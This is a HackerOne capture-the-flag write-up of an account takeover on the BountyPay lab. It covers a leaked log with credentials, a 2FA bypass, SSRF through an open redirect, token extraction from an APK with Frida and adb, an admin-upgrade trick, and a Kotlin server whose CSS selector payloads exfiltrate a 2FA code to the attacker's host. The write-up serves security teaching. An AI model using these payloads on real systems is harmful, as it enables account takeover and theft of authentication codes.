# [h1-2006 2020]  Chained vulnerabilities lead to account takeover

## Report Details
- **Report ID**: 895650
- **URL**: https://hackerone.com/reports/895650
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-10T19:52:36.708Z
- **Disclosed**: 2020-06-18T15:28:27.933Z

## Reporter
- **Username**: kanytu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Summary

Mårten Mickos lost his account for BountyPay, the new service HackerOne is using to pay bug bounties. In this report I explain how I accessed a customer's account using a log file and bypassed its 2FA validation. 

I then leverage an open redirect bug to gain access to an internal server and downloaded an Android application. The application contained credentials that allowed me to retrieve an `X-Token` for the API used by all services. 

In the API I created a new account for a new staff member and logged in as a staff. This allowed me to exploit a SSRF flaw and escalate from staff to admin. 

As an admin, I got access to Mårten Mickos's account and payed all bounties by exploiting a CSS Exfil vulnerability.



# Context

HackerOne tweeted that [@martenmickos](https://twitter.com/martenmickos) needed help with his account for BountyPay. Apparently he lost his credentials and needs help with the bounty payments.

{F862841}

At this point, HackerOne already released one hint. The Twitter page from [BountypayHQ](https://twitter.com/BountypayHQ). It contained some tweets about a new staff being hired. The twitter page was also following an account named [Sandra Allison](https://twitter.com/SandraA76708114). She posted what seems to be a barcode tag:

{F862866}

Now that we have context, let's start of with the [HackerOne CTF](https://hackerone.com/h1-ctf) program. 

I can see that the current scope for the CTF is `*.bountypay.h1ctf.com`.

# Entry point

Opening the `bountypay.h1ctf.com` opens a simple webpage 2 logins. One for staff and one for the customers.

Because we have domains with normal names, I started [Burp Suite](https://portswigger.net/burp) with [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack). My plan is to use a simple wordlist containing the most common domain names:

{F862846}

This search returned the following interesting sub-domains:

{F862849}

- `api.bountypay.h1ctf.com`

  Seems to be a REST API for the operations in all other subdomains

- `app.bountypay.h1ctf.com`

  Customer subdomain

- `staff.bountypay.h1ctf.com`

  Staff subdomain

- `software.bountypay.h1ctf.com`

  Maybe a repository/intranet which contains the software used by the employers. It can only be accessible from within.

I started with the `app` subdomain, which is the domain for customers to login.

Once again, I used [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) again with a wordlist of [common](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) web content to see if something interesting popups. 

The `.git/HEAD` file immediately pooped up. The `HEAD` doesn't contain useful information so I tried downloading the `.git/config` file. After opening this file, I noticed that a remote repository was configured:

```
[remote "origin"]
url = https://github.com/bounty-pay-code/request-logger.git
fetch = +refs/heads/*:refs/remotes/origin/*
```

Checking this [Github repo](https://github.com/bounty-pay-code/request-logger.git) I could see a `PHP` file that seems to process some parameters and write them in `Base64` in a file named `bp_web_trace.log`.

I navigated to `https://app.bountypay.h1ctf.com/bp_web_trace.log` and downloaded the log file. Decoding the contents of the file revealed a login log containing a password in plain text:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

Now I have an user:

- **Username:** brian.oliver
- **Password:** V7h0inzX

Let's log in.

# 2FA bypass

Logging in to `app.bountypay.h1ctf.com` with that user prompted me with an OTP request. 

{F862843}

This seems to be a [2FA](https://en.wikipedia.org/wiki/Multi-factor_authentication) step. My first step is to check what kind of data is sent back to server when I pressed `Login` in Chrome's Network separator.

{F862844}

So there is a challenge and a challenge answer. I did some more requests and noticed that the challenge is changing at every request.

The challenge seems to be a MD5 and checking the hash in [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) revelled I could be correct:

{F862845}

So, what data do I have so far? I do have a code that was previously used. That code was in the log file I checked earlier:

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
```

Something curious is that every entry in the log has a timestamp. So my guess was that the MD5 generated was the current timestamp. I tried submitting the 2FA request using the `challenge_answer` `bD83Jk27dQ` and the `challenge` `62ebf0344c5021cc7ef78d99c2137c8d` which is the MD5 of `1588931928`, the timestamp where the code was generated (when the login succeeded). This didn't work. Searching for those MD5 on Google didn't help either. 

I might need to use the previous `challenge_answer` and simulate a valid request. So if the MD5 isn't the hashed timestamp, could it be the answer itself? Let's hash `bD83Jk27dQ` to MD5 and try the request in Burp's Repeater:

{F862848}

Nice, I got a Cookie token and I'm logged in:

![image-20200610163458762](/Volumes/Articles/Security Articles/Bug Bounty/HackerOne/image-20200610163458762.png)

I am also familiar with that token start `eyJ`. I think that's a JSON. Let me decode it:

```
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```



# API Open Redirect

Tapping on `Load Transactions` seems to fire a request to `https://app.bountypay.h1ctf.com/statements?month=01&year=2020`

This request returns an URL for an API. This is the first time I see a usage of the previous scanned sub-domain. So this is the time to use it.

Navigating to the subdomain, I see that there is a redirect right at the homepage. I think I have to use this redirect somehow. The request from `/statements` also has a `data` object:

```json
{
   "url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020",
   "data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}
```

So, `/statements` requested the content from the API using the `url` and the API returned `data` as a result? That must be it.

I also noticed that these requests cannot be accessed from outside. Simply requesting https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ returns a missing token error.

If there is a redirect in the API domain, I might be able to redirect the user to somewhere else. The request to the API seems to be appending my account id. That account id is part of the token. So I can change the cookie and still be able to perform requests to the API? Let me try something:

I've changed the Cookie to a Base64 of:

```
 {"account_id":"aaa","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

And loaded the transactions again. The browser displayed an error popup saying that there was an invalid response from the server. But I'm still logged in, which is great. The server must be using the `hash` part and not the `account_id` to validate the login.

I think I got this. All I have to do, is to use that redirect and try to access another part of the API or another server.

Let me try the redirect into another website such as https://api.bountypay.h1ctf.com/redirect?url=https://www.atacker.com?q=REST+API

```
URL NOT FOUND IN WHITELIST
```

There's a white list. Okay. I've tried some urls and it seems that only www.google.com and the https://www.bountypay.h1ctf.com/ are whitelisted.

But when this is done through the `/statements` request. I might be able to get to other endpoints, right? I do have an endpoint that always returned 401 and that can only be accessed from within the network. 

So let's change the Cookie to

```json
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

Note that I need to traverse with a depth 2 in the path because `/redirect` is in the root.

This returned:

```json
{
   "url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

Now we have a 404, instead of 401. So I need to enumerate this server. I've used Burp's Intruder for this wirhPayload  Processing to generate the proper payload:

{F862850}

Notice the `?` in the suffix. This is to escape the `/statements?month=01&year=2020` that is appended to the url by the `/statement` endpoint.

I used the same wordlist as before and this returned the following dir that was not a 404:

```json
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

We have an APK here.

# APK token leak

After downloading the APK at https://software.bountypay.h1ctf.com/uploads/BountyPay.apk I opened it with [JADX](https://github.com/skylot/jadx):

```
$ jadx-gui BountyPay.apk
```

As an Android developer myself, I'm pretty familiar with how an APK works so this should be an easy challenge for me.

I always start off by checking the `AndroidManifest.xml` which gives me a summary of the attack surface of the app. It contains all entry points that external apps can use.

I noticed the app consists of 4 activities (or views):

- MainActivity
- PartOneActivity
- PartTwoActivity
- PartThreeActivity

All parts have [deep link](https://developer.android.com/training/app-links/deep-linking) configured which allows them to be opened by external apps or links.

Because the MainActivity is the first opened (intent action `android.intent.action.MAIN`), I started checking the code it contains.

It seems to contain a "submit username" logic and no dangerous code so I safely installed the APK on a rooted device using [ADB](https://developer.android.com/studio/command-line/adb):

```
$ adb install -r -t BountyPay.apk
```

I opened the app in the device which looks like this:

{F862851}

Checking at the code, in order to proceed to the `PartOneActivity` the following condition should be met:

```java
getSharedPreferences(KEY_USERNAME, 0).contains("USERNAME")
```

The username should be `USERNAME`. I've typed that in the username edit view and tapped the fab button which led me to the part one activity.

{F862852}

Looking again for `startActivity` in `PartOneActivity` revealed that the part two is opened if the following condition is met:

```java
getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")
```

`getIntent().getData()` can be sent by the app itself or external apps if the activity is exported. This can also be infered with deep link, which this activity has configured in the manifest. The link should containing a parameter `start` whose value is `PartTwoActivity`. The last condition is just to check that the initial step was completed.

Checking the manifest for `PartOneActivity`:

```
<data android:scheme="one" android:host="part"/>
```

Let's craft the URI and call it using `adb`:

```
$ adb shell am start -a "android.intent.action.VIEW" -d "one://part/?start=PartTwoActivity"
```

This is the same as tapping a link in a webpage:

```
<a href="one://part/?start=PartTwoActivity">Start</a>
```

{F862853}

Now, to part two, the conditions are:

{F862855}

We need to type the correct value of the `dataSnapshot` in an edit box. All edit boxes are invisible. To show them, we need deep linking again: 

```java
String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch");
if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on"))
```

Crafting the command:

```
$ adb shell am start -a "android.intent.action.VIEW" -d "two://part/?two=light\&switch=on"
```

Lights up:

{F862854}

Now, in order to know which value is being checked, I'm going to use [Frida](https://frida.re/). Frida is a powerful debugger that allows me to get access to internal variables and log their values. I can use JavaScript to create a script that logs me all values returned from `dataSnapshot.getValue()`. This way, I know exactly what value should be typed.

The frida script looks like this:

```javascript
Java.performNow(function() {
   Java.use("com.google.firebase.database.DataSnapshot").getValue.overload().implementation = function() {
    var result = this.getValue()
    console.log(result)
    return result
  }
}, 0)
```

It intercepts all calls to `getValue` from `DataSnapshot` and logs their value.

The result:

```
$ frida -U -l bounty_app.js --no-paus -f bounty.pay
     ____
    / _  |   Frida 12.8.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `bounty.pay`. Resuming main thread!                             
[HTC m8::bounty.pay]-> Token
```

The value is `Token`. The condition checks if the text inserted is equals to `X-Token`. Let's type that and tap Submit:

{F862856}

Also, the frida script, which was still running already logged 2 more values:

```
http://api.bountypay.h1ctf.com
8e9998ee3137ca9ade8f372739f062c1
```

Again, this should be opened with deep linking params. The logic is the same, but this time they are encoded in Base64.

```
$ adb shell am start -a "android.intent.action.VIEW" -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token"
```

{F862857}

Lights up again.

So the leaked hash should be the one that was already printed by Frida.

```
$ adb shell input text 8e9998ee3137ca9ade8f372739f062c1
```

Tap submit and ....

{F862858}

Checking the logs from the app with `adb logcat` shows:

```
2020-06-10 18:04:41.481 4207-5742/bounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com
2020-06-10 18:04:41.481 4207-5742/bounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1
2020-06-10 18:04:41.485 4207-5742/bounty.pay D/HEADER VALUE AND HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

We have a token for the API. Let's see if I can make a request:

{F862859}



# Escalation to admin

I decided to list all endpoints using a [wordlist](https://github.com/chrislockard/api_wordlist/blob/master/objects.txt) containing common API endpoints.

There are 2 endpoints. `/api/staff` and `/api/accounts`

The `/api/staff` lists all accounts  from `staff.bountypay.h1ctf.com` and the `/api/accounts` the ones from `app.bountypay.h1ctf.com`. I already have an account for customers. I need a staff account. After some tries I eventually got a valid request when doing a `POST` rather than a `GET `.

```
["Missing Parameter"]
```

Okay... The parameter should be `staff_id` which was seen in the object from `/api/staff`.

I tried `staff_id=STF:84DJKEIP38` but the response said: 

```
["Staff Member already has an account"]
```

This endpoint is creating a new account. I need to use a staff that was not in the list. I remember that Twitter page containing Sara's STF id. 

Let me try that:

{F862860}

Epic. I have a Staff account. Let's log in.

{F862867}

There's a lot of stuff here. So I gathered all information I could about this:

- Multiple HTML templates injected with `?template=`
- A list of tickets
- A detailed page of a ticket
- A logout feature
- A profile change feature (avatar and name)
- A `webpage.js` containing admin logic for `/admin`
- A report page feature

I've run a scan again and found out that there is also an `admin` template but that is locked for admins only.

I tried a lot of stuff here. I tried decrypting the token for this domain page, XSS with avatar and name, SQLi in the `ticket_id ` but nothing worked. 

The only thing that eventually worked was PHP array parameters:

 https://staff.bountypay.h1ctf.com/?template[]=home&template[]=ticket

After a day of rest, I restarted with a fresh head and the mindset that I need to upgrade my account to admin to access the new template.

The report page seems to be the only way to submit data for an admin to read. It also says that the `/admin` pages will be ignored. So, I can't just send the `/admin/upgrade` request directly to them.

Okay, I might need to use the profile change feature. Changing the avatar is reflect in the ticket's page. The avatar is injected in the HTML as a `class`. The `js` also contains a trigger click logic for when `#tab1` is in the url so it should be easy to click on my avatar. I can change my avatar to the `upgradeToAdmin tab1` and it might work:

After navigating to https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab1 I noticed that the avatar was indeed clicked, which triggered the following request:

https://staff.bountypay.h1ctf.com/admin/upgrade?username=undefined

I'm on to something. I need to infer the username somehow. Checking the javascript I concluded that the username was taken from an input field with id `username`. This should have a been easy step from here, but I totally forgot about the login webpage. I wasted a lot of time here. Eventually I remembered the `login` page so I tried this:

https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1

This correctly triggered an upgrade request to my username. I reported the Base64 version of `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1` to the `/admin/report` and retried fetching the admin template again:

https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=

Opened https://staff.bountypay.h1ctf.com/?template=admin:

```
view admin
```



#CSS exfiltration

Falling back to `/?template=home` there is a new `Admin` tab :

{F862861}

There's the password for `marten.mickos` but still no flag.

I've logged in to the Customer portal with its credentials. 2FA was asked again and I reused the same `challenge` and `challenge_answer` as before.

Now in, there are some payments left for 05/2020:

{F862862}

Let's pay them.

{F862863}

Oh no, another 2FA. 

I tapped send challenge and a CSS page was sent in the request. That's odd.

```
app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

I proceeded without checking the CSS yet. The next page asks for a 7 chars code. It seems that we have two minutes to send the code.

The following data is sent to the server:

- challenge_timeout 
- challenge

The `challenge_timeout` is a timestamp and the `challenge` is another MD5.

Let's go back to that CSS page:

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

This is a branding CSS page. It looks like the 2FA app changes its layout according to the brand requesting the code. 

I've fired up [ngrok](https://ngrok.com/) and created a simple HTTP tunnel to see if I get any request back when sending my URL rather than that CSS one.

```
$ ./ngrok http 8080
```

After sending my page to https://app.bountypay.h1ctf.com/pay/ I got a response back in ngrok:

```
HTTP Requests                                                                                                                                                                                     
-------------                                                                                                                                                                                     
                                                                                                                                                                                                  
GET /                          200 OK    
```

I checked the headers of the request but nothing relevant there.

I don't know any CSS attacks. So I googled for `css attack vectors`.

Google though I was searching for `XSS` but the 3rd result lead me to a [page](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense) that described a exfiltration attack using only CSS selectors. 

I opened [IntelliJ IDEA](https://www.jetbrains.com/idea/) and coded a quick [ktor](https://ktor.io/) server in [Kotlin](https://kotlinlang.org/). The server basically returns a CSS page with a background to another page of the server. I just wanted to make sure that CSS is processed:

```kotlin
fun main() {
    val server = embeddedServer(Netty, port = 8081) {
        routing {
            get("/test") {
                call.respondText("""
                    body {
                        background-image:url("/test2");
                    }
                """.trimIndent(), ContentType.Text.CSS)
            }

            get("/test2") {
                println("GOT REQUEST")
                call.respondText("", ContentType.Image.JPEG)
            }
        }
    }
    thread {
        server.start(wait = true)
    }
}
```

And the result:

{F862864}

Everything good so far. I started by checking if the server had any `<input>` field by returning the following CSS:

```css
input {
	background-image:url("/test2");
}
```

I got a request. So this means that the page has an `<input>` field. That is where the code should be. I improved my code to retrieve the name of the input.

The method generates an exfiltration payload containing all possible letters and numbers pointing the background url back to the server with the letter that got an hit:

```kotlin
const val allowedChars = "0123456789abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVXYZ"
//...
private fun generateExfilPayload(): String {
    val singleExfilPayload = """
        input[name^=%s] {
            background:url(/hit?char=%s);
        }
        
    """.trimIndent()

    val builder = StringBuilder()

    for (char in allowedChars.toCharArray()) {
        builder.append(singleExfilPayload.format(char, char))
    }

    return builder.toString()
}
```

I'm using `input[name^=%s]` which means that any input field whose name starts with the letter `%s` will have a background of `/hit?char=%s`. When I get back the first result, I update the server to include the new letter. 

Imagining that the input is `username`, I should receive first a `/hit?char=u`. Changing the selector to `input[name^=u%s]` should give me the second char and so on.

This gave me an input named `code`. I did a quick double check with `input[name=code]` but nothing popped up. The input starts with `code` but it's not code. And the char next is not available in my `allowedChars`. I tested for both `-`and `_` and I got a hit at the underscore. I proceed with the payload `input[name^=code_%s]` and I got 7 hits.

What? There are 7 codes in this application? So the user can pick one at will? Well I do have more than one backup code for 2FA in my personal apps. Maybe that's the case. Let's focus on `code_1`.

This is where things went crazy. At every request, the code from the input changed. There is no way I could retrieve all possible chars of `code_1`. Exactly. All possible chars. At this point I was totally convinced that there were 7 inputs, each one with 7 digits, representing 7 different codes. And it would be a pain to retrieve them since they are changing at every request.

I came across with a Medium [post](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) with a great proof of concept about how we can use a chain of `@import` and delay the response until we know what is the first char. We then return the first `@import` containing another `@import` and the payload for the second char and so on. It sounded epic. I decided to code my own.

It didn't work... The second request never came. I should have know by know that the code was only one digit.

I tried another selector. `input[name$=%s]`. This is an ends-with instead of starts-with. The result for starts-with and ends-with returned the same character. Af first I was like "Okay, what are the odds right? The code starts and ends with the same char.". Until I tried it again...and again... and eventually got it. They do not start and end with the same char. They have only one char... Oh my god. It's easier and I over engineered the whole thing.

Back to Kotlin, I've updated my `generateExfilPayload` method to return the following:

```kotlin
const val codeSize = 7
//...
private fun generateExfilPayload(): String {
    val singleExfilPayload = """
        input[name=code_%d][value='%s'] {
            background:url(/hit?char=%s&position=%d);
        }
        
    """.trimIndent()

    val builder = StringBuilder()

    for (i in 1..codeSize)
        for (char in allowedChars.toCharArray()) {
            builder.append(singleExfilPayload.format(i, char, char, i))
        }

    return builder.toString()
}
```

This basically creates a CSS page that contains 7 blocks of 61 `input[name=code_%d][value='%s']`. One for each char and each input.

Firing up the server and sending the URL again:

```
Got a new hit - p
Current value - p
Got a new hit - Z
Current value - pZ
Got a new hit - Z
Current value - pZZ
Got a new hit - z
Current value - pzZZ
Got a new hit - 3
Current value - pzZ3Z
Got a new hit - Z
Current value - pzZ3ZZ
Got a new hit - D
Current value - pzZ3ZDZ
```

Using the `challenge_timeout` and `challenge` returned by `POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba` and submitting the `challenge_answer` `pzZ3ZDZ`...

{F862865}

Here is the flag:

```
^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
```



# Conclusion

This was my first big CTF and learned a lot from it. The APK was the easiest part since I already had a good setup ready. Using Frida to log the variables was a fast way to know which kind of validations were done.

The privilege escalation to admin took me a lot of time to figure out. There were a lot of components involved and need to perform the attack. The fact that I took so much time in the paged already logged in, made me forget about the `login` template so I also wasted a lot of time figuring out how to inject the username.

The CSS was really funny. It also teach me not to make assumptions that easy. I've coded a whole server similar to [sic](https://github.com/d0nutptr/sic) just to see it fail because there was only one char, and not 7. After figuring out that the code was only 1 digit, reaching the flag was pretty quick.



# References

- https://portswigger.net/burp
- https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
- https://en.wikipedia.org/wiki/Multi-factor_authentication
- https://www.tunnelsup.com/hash-analyzer/
- https://developer.android.com/training/app-links/deep-linking
- https://developer.android.com/studio/command-line/adb
- https://frida.re/
- https://github.com/chrislockard/api_wordlist/blob/master/objects.txt
- https://ngrok.com/
- https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
- https://www.jetbrains.com/idea/
- https://ktor.io/
- https://kotlinlang.org/
- https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b
- https://github.com/d0nutptr/sic
- https://www.w3schools.com/cssref/css_selectors.asp
- https://www.base64encode.org/
- https://www.md5hashgenerator.com/
- https://schoolsofweb.com/how-to-pass-an-array-as-url-parameter-in-php/



@kanytu

## Impact

Full account take over

## Attachments
- image-20200610152656148.png
- image-20200610161510108.png
- image-20200610161822445.png
- image-20200610162130831.png
- image-20200610162826486.png
- image-20200610163458762.png
- image-20200610163322982.png
- image-20200610163615429.png
- image-20200610172547703.png
- image-20200610174127554.png
- image-20200610174156535.png
- image-20200610174809323.png
- image-20200610175715082.png
- image-20200610174927729.png
- image-20200610180324260.png
- image-20200610180539642.png
- image-20200610180653061.png
- image-20200610181130391.png
- image-20200610182401367.png
- image-20200610184700529.png
- image-20200610185059036.png
- image-20200610185114978.png
- image-20200610190851911.png
- image-20200610193411771.png
- image-20200610193822548.png
- image-20200610182512518.png
- server.zip
